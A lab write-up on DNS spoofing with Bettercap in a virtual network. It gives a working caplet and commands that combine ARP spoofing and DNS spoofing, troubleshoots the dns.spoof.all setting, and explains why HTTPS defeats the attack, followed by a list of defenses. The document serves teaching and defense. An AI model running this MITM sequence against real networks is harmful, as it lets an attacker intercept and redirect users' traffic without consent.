# DNS Spoofing with Bettercap - A Learning Experience

## Disclaimer
This writeup is for **educational purposes only** in authorized lab environments. Unauthorized network attacks are illegal.

---

## Lab Environment

- **Attacker Machine**: Kali Linux (IP: 172.16.236.128)
- **Target Machine**: Windows VM (IP: 172.16.236.145)
- **Gateway**: 172.16.236.2
- **Tool**: Bettercap, Apache2
- **Network**: VMware/VirtualBox virtual network

---

## Objective

Perform DNS spoofing to redirect a target's web traffic to a malicious server. When the Windows machine attempts to visit a legitimate website, they should instead be served content from our attacker-controlled web server.

---

## Prerequisites

Before starting DNS spoofing, the following must be in place:

1. **ARP spoofing already active** - We need to be in a MITM position
2. **IP forwarding enabled** - Traffic must flow through our machine
3. **Web server running** - Something to serve when victims visit spoofed domains

---

## Phase 1: Setting Up the Web Server

DNS spoofing redirects domain names to our IP address, but we need a web server to actually respond when victims connect.

### Installing and Configuring Apache

```bash
# Install Apache (if not already installed)
sudo apt install apache2

# Start Apache
sudo systemctl start apache2

# Verify it's running
sudo systemctl status apache2
```

### Creating a Fake Page

```bash
# Navigate to web root
cd /var/www/html

# Edit the default page
sudo nano index.html
```

I replaced the default Debian page with custom content:

```html
<h1>You've been DNS spoofed!</h1>
<p>This is not the website you were looking for.</p>
```

### First Issue: Page Not Updating

After editing `index.html`, I visited `http://172.16.236.128` in my browser and still saw the old Debian page. The issue was **browser caching**.

**Solution:**
- Hard refresh: `Ctrl + F5`
- Or test from command line: `curl http://172.16.236.128`

The page was actually updated (Windows VM could see it), but my Kali browser had cached the old version.

**Lesson learned:** Always test from the target machine or use `curl` to bypass browser cache.

---

## Phase 2: Attempting DNS Spoofing

With the web server ready and ARP spoofing active, I attempted DNS spoofing.

### Initial Attempt: Kotaku.com

My first target was `kotaku.com`, a popular gaming news site.

```bash
# In Bettercap
set dns.spoof.all true
set dns.spoof.domains kotaku.com
set dns.spoof.address 172.16.236.128
dns.spoof on
```

**What happened:**

Bettercap's logs showed DNS spoofing was working:
```
[sys.log] [inf] dns.spoof sending spoofed DNS reply for kotaku.com (->172.16.236.128) to 172.16.236.145
```

However, on the Windows VM, the site wouldn't load:
```
このサイトにアクセスできません
ERR_QUIC_PROTOCOL_ERROR
```

### Why This Failed: HTTPS and Modern Protocols

The problem was **HTTPS and QUIC protocol**:

1. Kotaku uses HTTPS (encrypted connections)
2. My Apache server doesn't have Kotaku's SSL certificate
3. The browser attempts an HTTPS connection to my server
4. SSL handshake fails because certificates don't match
5. Connection rejected with protocol error

**Lesson learned:** DNS spoofing alone is insufficient for HTTPS sites. Modern web security (SSL/TLS, HSTS, certificate pinning) prevents simple DNS spoofing attacks from working on major websites.

---

## Phase 3: Testing with HTTP-Only Sites

To verify DNS spoofing actually works, I needed to test with plain HTTP sites.

### Attempt with neverssl.com

I tried `neverssl.com`, which is designed to use HTTP:

```bash
set dns.spoof.domains neverssl.com
set dns.spoof.address 172.16.236.128
dns.spoof on
```

**Result:** `DNS_PROBE_FINISHED_NXDOMAIN`

The site wasn't resolving at all, even though it's a legitimate site. I was confused whether the site was even valid.

### Critical Issue: Lost Internet Connectivity

At this point, the Windows VM lost all internet connectivity. Any website I tried to visit returned DNS errors.

**The problem:** When DNS spoofing was active, DNS resolution was completely broken.

**Quick fix:** 
```bash
# In Bettercap
dns.spoof off
```

Internet immediately returned. This confirmed the DNS spoofing configuration was causing the issue, not network problems.

---

## Phase 4: Understanding `dns.spoof.all`

The breakthrough came when I removed `set dns.spoof.all true` from my configuration.

### The Working Configuration

```bash
# Enable IP forwarding first
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# In Bettercap (with ARP spoofing already running)
set dns.spoof.address 172.16.236.128
set dns.spoof.domains example.com
dns.spoof on
```

**This worked!** When I visited `http://example.com` on Windows, I saw my fake Apache page.

### Why `dns.spoof.all true` Broke Everything

Here's the crucial difference:

**`dns.spoof.all false` (default behavior):**
- Only spoofs domains explicitly listed in `dns.spoof.domains`
- All other DNS queries pass through to legitimate DNS servers
- Target can still browse the internet normally
- Only the specified domain is redirected

**`dns.spoof.all true`:**
- Attempts to spoof **every single DNS query**
- Redirects ALL domains to the specified IP address
- If your web server isn't configured to handle all domains, connections fail
- Result: Complete DNS breakdown and no internet connectivity

**When to use each:**

- **`dns.spoof.all false`**: Targeted attacks on specific domains (most common use case)
- **`dns.spoof.all true`**: Captive portal scenarios where you want to redirect all traffic to a single page (requires proper web server configuration with virtual hosts)

---

## Final Working Setup

### Complete Command Sequence

**1. Prepare the environment:**
```bash
# Enable IP forwarding
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Start Apache
sudo systemctl start apache2

# Create custom page
sudo nano /var/www/html/index.html
```

**2. Launch Bettercap with caplet:**

My `spoof.cap` file:
```
net.probe on
set arp.spoof.fullduplex true
set arp.spoof.targets 172.16.236.145
arp.spoof on
set dns.spoof.address 172.16.236.128
set dns.spoof.domains example.com
dns.spoof on
net.sniff on
```

**3. Execute:**
```bash
sudo bettercap -iface eth0 -caplet spoof.cap
```

**4. Test on Windows VM:**

Visit `http://example.com` - the fake page from Apache appears instead of the legitimate site.

---

## Verification

### On Windows VM

```cmd
# Check ARP cache - gateway should show attacker's MAC
arp -a

# Try to visit the spoofed domain
http://example.com
```

### On Kali (Bettercap logs)

```
[sys.log] [inf] dns.spoof sending spoofed DNS reply for example.com (->172.16.236.128) to 172.16.236.145
```

This confirms the DNS query was intercepted and a fake reply was sent.

---

## Limitations and Reality Check

### What Works
- ✅ Plain HTTP sites (increasingly rare)
- ✅ Sites without HSTS or certificate pinning
- ✅ Local intranet sites
- ✅ IoT devices with HTTP interfaces

### What Doesn't Work
- ❌ HTTPS sites (certificate mismatch errors)
- ❌ Sites with HSTS enabled (browser refuses downgrade)
- ❌ Apps with certificate pinning
- ❌ Modern websites (most use HTTPS by default)

### The Modern Web Reality

DNS spoofing has become significantly less effective due to widespread HTTPS adoption. Attempting to spoof major websites like:
- Social media (Facebook, Twitter, Instagram)
- Search engines (Google, Bing)
- News sites (most major outlets)
- Banking sites
- E-commerce sites

...will result in browser security warnings or connection failures because these sites use HTTPS with strict security policies.

---

## Troubleshooting Guide

### Issue: Internet Stops Working When DNS Spoofing Starts

**Cause:** `dns.spoof.all true` or IP forwarding not enabled

**Solution:**
```bash
# Turn off dns.spoof.all
set dns.spoof.all false

# Verify IP forwarding
cat /proc/sys/net/ipv4/ip_forward  # Must return 1
```

### Issue: DNS Queries Not Being Intercepted

**Cause:** ARP spoofing not working, or target using hardcoded DNS servers

**Solution:**
```bash
# Verify ARP spoofing is active
arp.spoof on

# On Windows, check if gateway MAC is spoofed
arp -a

# Ensure IP forwarding is enabled
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

### Issue: Site Resolves But Won't Load

**Cause:** No web server running on the spoofing IP, or wrong IP address

**Solution:**
```bash
# Verify Apache is running
sudo systemctl status apache2

# Verify you're using the correct IP
ip addr show eth0

# Test locally
curl http://172.16.236.128
```

### Issue: HTTPS Sites Showing Certificate Errors

**Cause:** This is expected behavior - you don't have the legitimate site's certificate

**Solution:** Use HTTP-only test sites, or understand this demonstrates why HTTPS is effective against DNS spoofing

---

## Defense Mechanisms

How to protect against DNS spoofing:

1. **HTTPS Everywhere** - Most effective defense; certificates prevent spoofing
2. **DNSSEC** - Cryptographically signs DNS responses
3. **DNS over HTTPS (DoH)** - Encrypts DNS queries
4. **DNS over TLS (DoT)** - Encrypts DNS queries
5. **Static DNS entries** - Hardcode important domains in hosts file
6. **VPN** - Encrypts all traffic including DNS queries
7. **Network monitoring** - Detect unusual DNS response patterns

---

## Key Takeaways

1. **DNS spoofing requires MITM position** - ARP spoofing (or other MITM technique) must be active first

2. **IP forwarding is critical** - Without it, the target loses all connectivity

3. **Web server is necessary** - DNS spoofing just redirects; you need something to respond

4. **`dns.spoof.all` is dangerous** - It breaks all DNS resolution unless properly configured; use targeted domain spoofing instead

5. **HTTPS defeats simple DNS spoofing** - Modern web security makes this attack far less effective than it was in the HTTP era

6. **Browser caching matters** - Always test from the target machine, not the attacker machine

7. **The attack still works on HTTP** - Legacy systems, internal applications, and IoT devices often still use HTTP

---

## Conclusion

While DNS spoofing is a classic attack technique, its effectiveness has been significantly reduced by the widespread adoption of HTTPS and modern security protocols. The attack still demonstrates important networking concepts and remains relevant for:

- Internal network assessments
- Legacy system testing
- IoT security research
- Educational purposes

The most valuable lesson from this exercise was understanding why modern security measures exist. The failures (HTTPS blocking, certificate errors, QUIC protocol issues) aren't bugs - they're security features working as intended.

DNS spoofing in 2025 serves more as a demonstration of why HTTPS and encrypted DNS are critical for internet security rather than as a practical attack vector against modern web applications.

---

## References

- [Bettercap Documentation](https://www.bettercap.org/)
- [DNS Spoofing Module](https://www.bettercap.org/modules/ethernet/spoofers/dns.spoof/)
- Apache2 Documentation
- RFC 1035 (DNS Protocol)
